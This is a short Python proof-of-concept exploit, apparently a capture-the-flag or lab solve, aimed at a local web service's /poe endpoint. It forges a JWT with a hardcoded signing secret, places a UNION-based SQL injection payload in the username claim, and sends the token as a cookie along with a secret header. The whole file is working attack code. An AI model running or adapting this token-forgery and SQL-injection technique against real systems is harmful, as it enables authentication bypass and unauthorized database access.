import requests, jwt

path = 'http://localhost:8081'

jwt_token = jwt.encode({
    "username": "' union select 'test', FROM_UNIXTIME(1) # ",
    "poe_times": 0,
    "jwt_id": "fZL86HnQpCBAP1z1_TtSqQ"}, "superfulusecret", algorithm="HS256")

headers = {
    "Cookie": "token=" + jwt_token,
    "SECRETKEY": "secret"
}

res = requests.get(
    path + '/poe',
    headers=headers
)

print(res.text)